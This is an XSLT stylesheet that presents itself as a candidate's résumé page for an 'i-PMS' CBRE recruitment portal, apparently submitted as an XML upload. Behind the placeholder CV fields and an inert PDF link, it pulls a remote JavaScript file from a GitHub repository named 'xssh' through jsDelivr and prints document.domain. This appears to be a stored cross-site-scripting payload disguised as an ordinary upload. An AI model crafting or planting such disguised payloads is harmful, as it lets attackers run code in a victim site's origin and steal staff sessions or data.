<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html" omit-xml-declaration="yes"/>
<xsl:template match="/">
<html><head><meta charset="utf-8"/><title>i-PMS :: CBRE - Currículo</title>
<style>
body{font-family:Arial,Helvetica,sans-serif;background:#f4f6f9;margin:0;color:#333}
#w{max-width:820px;margin:40px auto;background:#fff;padding:30px;border-radius:6px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
h1{font-size:19px;color:#0b3d91;margin:0 0 4px}
.sub{color:#777;font-size:13px;margin-bottom:18px}
.row{border-top:1px solid #eee;padding:10px 0;font-size:14px}
.row b{display:inline-block;min-width:130px;color:#0b3d91}
.pdf{display:inline-block;margin-top:18px;padding:9px 14px;background:#0b3d91;color:#fff;border-radius:4px;font-size:14px;text-decoration:none}
#st{float:right;color:#bbb;font-size:11px}
</style></head>
<body><div id="w">
<span id="st">carregando…</span>
<h1>Currículo — Banco de Talentos</h1>
<div class="sub">Documento recebido pelo portal i-PMS</div>
<div class="row"><b>Nome</b> Candidato</div>
<div class="row"><b>Nascimento</b> 01/01/1990</div>
<div class="row"><b>Situação</b> Em análise</div>
<div class="row"><b>Origem</b> Upload do candidato (XML)</div>
<a class="pdf" href="#" onclick="return false">Baixar currículo (PDF)</a>
<script src="https://cdn.jsdelivr.net/gh/sittiev/xssh@main/p.js"></script>
<script>try{document.getElementById('st').textContent=document.domain;}catch(e){}</script>
</div></body></html>
</xsl:template></xsl:stylesheet>
